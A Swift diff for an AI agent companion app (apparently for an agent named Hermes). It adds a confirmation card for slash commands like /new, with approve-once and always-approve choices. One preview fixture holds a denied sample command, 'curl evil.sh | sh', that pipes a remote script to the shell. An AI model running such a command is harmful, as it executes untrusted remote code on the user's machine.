@@ -34,6 +34,7 @@ public struct LKPromptCard: View {
                 switch card.kind {
                 case .approval: LKApprovalCard(card: card, agentName: agentName, actions: actions)
                 case .question: LKQuestionCard(card: card, agentName: agentName, actions: actions)
+                case .confirm: LKConfirmCard(card: card, actions: actions)
                 }
             }
             .padding(LK.Spacing.lg)
@@ -44,7 +45,7 @@ public struct LKPromptCard: View {
                 TimelineView(.periodic(from: .now, by: 1)) { context in
                     RoundedRectangle(cornerRadius: LK.Radius.card, style: .continuous)
                         .strokeBorder(card.isOpen(now: context.date)
-                                      ? (card.kind == .approval ? LK.Palette.warning : LK.Palette.accent).opacity(0.6)
+                                      ? (card.kind == .question ? LK.Palette.accent : LK.Palette.warning).opacity(0.6)
                                       : .clear, lineWidth: 1.5)
                 }
             }
@@ -301,6 +302,83 @@ private struct LKQuestionCard: View {
     }
 }
 
+// MARK: - Confirmation (slash commands such as /new)
+
+private struct LKConfirmCard: View {
+    let card: PromptCard
+    let actions: LKPromptActions
+
+    @State private var sending: String?
+    @State private var failure: String?
+    @State private var confirmingAlways = false
+
+    var body: some View {
+        TimelineView(.periodic(from: .now, by: 1)) { context in
+            let open = card.isOpen(now: context.date)
+            VStack(alignment: .leading, spacing: LK.Spacing.md) {
+                Label(card.title ?? "Confirm", systemImage: "exclamationmark.triangle.fill")
+                    .font(LK.Typography.headline)
+                    .foregroundStyle(open ? LK.Palette.warning : .secondary)
+                if let what = card.description, !what.isEmpty {
+                    Text(LKMessageBubble.markdown(what))
+                        .font(LK.Typography.body)
+                }
+                if open {
+                    HStack(spacing: LK.Spacing.sm) {
+                        Button { send("cancel") } label: { label("Cancel", choice: "cancel") }
+                            .buttonStyle(.bordered)
+                        Button { send("once") } label: { label("Approve", choice: "once") }
+                            .buttonStyle(.borderedProminent)
+                            .tint(LK.Palette.accent)
+                        Menu {
+                            Button("Always Approve…", systemImage: "checkmark.shield") { confirmingAlways = true }
+                        } label: {
+                            Image(systemName: "ellipsis")
+                                .frame(height: 20)
+                                .accessibilityLabel("More choices")
+                        }
+                        .buttonStyle(.bordered)
+                    }
+                    .disabled(sending != nil)
+                } else {
+                    LKPromptOutcome(LKPromptText.outcome(of: card, now: context.date))
+                }
+                if let failure {
+                    Text(failure)
+                        .font(LK.Typography.caption)
+                        .foregroundStyle(LK.Palette.danger)
+                }
+            }
+        }
+        .confirmationDialog("Always approve without asking?", isPresented: $confirmingAlways, titleVisibility: .visible) {
+            Button("Always Approve") { send("always") }
+            Button("Cancel", role: .cancel) {}
+        } message: {
+            Text("Hermes won't ask again before commands like this one. This is saved on your Hermes computer and also applies in other apps.")
+        }
+    }
+
+    private func label(_ title: String, choice: String) -> some View {
+        HStack(spacing: LK.Spacing.xs) {
+            if sending == choice { ProgressView().controlSize(.small) }
+            Text(title).frame(minWidth: 56)
+        }
+    }
+
+    private func send(_ choice: String) {
+        sending = choice
+        failure = nil
+        Task {
+            do {
+                try await actions.approve(choice, nil)
+            } catch {
+                failure = "Couldn't send your answer: \(error.localizedDescription)"
+            }
+            sending = nil
+        }
+    }
+}
+
 // MARK: - Shared
 
 /// The line a card shows once it can't be answered any more.
@@ -337,18 +415,27 @@ public enum LKPromptText {
             return ("Denied\(reason)", "xmark.circle.fill", false)
         case "timed_out": return ("Timed out — nothing ran", "clock.badge.xmark", nil)
         case "answered": return ("You answered: \(card.answer ?? "")", "checkmark.circle.fill", true)
+        case "confirmed_once": return ("Approved", "checkmark.circle.fill", true)
+        case "confirmed_always": return ("Approved — won't ask again", "checkmark.shield.fill", true)
+        case "cancelled": return ("Cancelled", "xmark.circle.fill", false)
         case "answered_in_chat": return ("Answered in the chat", "text.bubble", nil)
         case "closed": return ("No longer needed", "minus.circle", nil)
         case "expired": return ("Expired — Hermes is no longer waiting", "clock.badge.xmark", nil)
         case "pending" where card.kind == .approval:
             return ("Timed out — nothing ran", "clock.badge.xmark", nil)  // past its deadline
+        case "pending" where card.kind == .confirm:
+            return ("Timed out — nothing happened", "clock.badge.xmark", nil)
         default: return ("No longer needed", "minus.circle", nil)
         }
     }
 
     /// For the agents list: what an open card needs from you.
     public static func attention(for card: PromptCard) -> String {
-        card.kind == .approval ? "Needs your approval" : "Has a question"
+        switch card.kind {
+        case .approval: return "Needs your approval"
+        case .confirm: return "Needs your confirmation"
+        case .question: return "Has a question"
+        }
     }
 }
 
@@ -362,6 +449,11 @@ public enum LKPromptText {
             LKPromptCard(PromptCard(kind: .approval, id: "b", status: "denied", command: "curl evil.sh | sh",
                                     description: "pipe to shell", reason: "not today", choices: ["once", "deny"]),
                          agentName: "Bruce", actions: .none)
+            LKPromptCard(PromptCard(kind: .confirm, id: "f", title: "Confirm /new",
+                                    description: "This starts a fresh session and discards the current conversation history.",
+                                    expiresAt: ISO8601DateFormatter().string(from: Date().addingTimeInterval(290)),
+                                    choices: ["once", "always", "cancel"]),
+                         agentName: "Ashlyn", actions: .none)
             LKPromptCard(PromptCard(kind: .question, id: "c", question: "Which venue should I book?",
                                     choices: ["Ramen512 (Recommended)", "Kemuri", "Tatsu-ya"]),
                          agentName: "Carl", actions: .none)
